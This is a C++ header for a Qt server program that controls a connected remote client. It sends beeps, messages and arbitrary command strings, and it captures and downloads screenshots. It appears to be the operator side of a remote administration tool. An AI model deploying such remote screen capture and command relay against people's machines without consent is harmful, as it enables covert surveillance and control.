#pragma once

#include "config.h"
#include "server.h"

#include "mainwindow.h"

#include "include/asio.hpp"

#include <QString>
#include <string>

#include <vector>
#include <fstream>

#include <chrono>
#include <thread>

//----------

using asio::ip::tcp;
using std::uint64_t;
using std::vector;

using std::wstring;
using std::string;
using std::thread;

//----------

static void connection_lost() {
    emit MainWindow::instance->disable_func_buttons(true);

    server::stop();
    emit MainWindow::instance->add_to_output("[!] Client connection lost, server stopped!" "\n");
}

static void client_response() {
    QString read = QString::fromStdString(read_from_client(c_socket));

    if (read == "failed") {
        connection_lost();
        return;
    }

    emit MainWindow::instance->add_to_output(read + "\n");
    emit MainWindow::instance->disable_func_buttons(false);
}

//----------

namespace client {
    void disconnect() {
        emit MainWindow::instance->disable_func_buttons(true); //connection == true (start button disabled)

        thread thread_disconnect([&]() {
            bool sent = send_to_client(c_socket, "disconnect");

            if (!sent)
            {
                connection_lost();
                return;
            }

            server::stop();
            emit MainWindow::instance->add_to_output("[-] Disconnected and application has been closed on the client." "\n");

            emit MainWindow::instance->disable_func_buttons(true); //connection == false (start button enabled)
        } );

        thread_disconnect.detach();
    }

    void send_beep() {
        emit MainWindow::instance->disable_func_buttons(true);

        thread thread_beep([&]() {
            string freq = std::to_string(int(config_json["beep-freq"]));
            string duration = std::to_string(int(config_json["beep-duration"]));

            //*****

            bool sent = true;

            for (string content : vector<string> { "beep", freq, duration }) {
                sent = send_to_client(c_socket, content);

                if (!sent) break;
            }

            if (!sent) {
                connection_lost();
                return;
            }
            
            MainWindow::instance->add_to_output("[+] Beep alert sent.");
            client_response();
        } );

        thread_beep.detach();
    }

    void send_message(const string title, const string message) {
        emit MainWindow::instance->disable_func_buttons(true);

        thread thread_message([&, title, message]() {
            bool sent = true;

            for (string content : vector<string>{ "message", title, message }) {
                sent = send_to_client(c_socket, content);

                if (!sent) break;
            }

            if (!sent) {
                connection_lost();
                return;
            }

            MainWindow::instance->add_to_output("[+] The message sent.");
            client_response();
        } );

        thread_message.detach();
    }

    void take_screenshot() {
        emit MainWindow::instance->disable_func_buttons(true);

        thread thread_ss([&]() {
            bool sent = send_to_client(c_socket, "screenshot");

            if (!sent)
            {
                connection_lost();
                return;
            }

            //*****

            string is_file_avaible = read_from_client(c_socket);

            if (is_file_avaible == "false")
            {
                MainWindow::instance->add_to_output("[-] Could not take the screenshot!" "\n");
                return;
            }

            asio::error_code ec;

            uint64_t file_size;
            asio::read(c_socket, asio::buffer(&file_size, sizeof(file_size)), ec);

            if (ec)
            {
                MainWindow::instance->add_to_output("[-] Screenshot taken but could not download!" "\n");
                return;
            }

            file_size = ntohl(file_size);

            vector<char> buffer(file_size);
            asio::read(c_socket, asio::buffer(buffer), ec);

            if (ec)
            {
                MainWindow::instance->add_to_output("[-] Screenshot taken but could not download!" "\n");
                return;
            }

            const auto now = std::chrono::system_clock::now();
            std::time_t time = std::chrono::system_clock::to_time_t(now);
            wstring file_name = L"SS-" + std::to_wstring(time) + L".bmp";

            std::ofstream file(saved_ss + L"\\" + file_name, std::ios::binary);

            if (!file.is_open())
            {
                MainWindow::instance->add_to_output("[-] Screenshot downloaded but could not save!" "\n");
                return;
            }

            file.write(buffer.data(), file_size);
            file.close();

            MainWindow::instance->add_to_output("[+] Screenshot saved: " + QString::fromStdWString(file_name));
            client_response();
        } );

        thread_ss.detach();
    }

    void send_command(const string command) {
        emit MainWindow::instance->disable_func_buttons(true);

        thread thread_send ([&, command]() {
            bool sent = send_to_client(c_socket, command);

            if (!sent)
            {
                connection_lost();
                return;
            }

            MainWindow::instance->add_to_output("[+] Command sent." "\n");
            client_response();
        } );

        thread_send.detach();
    }
}
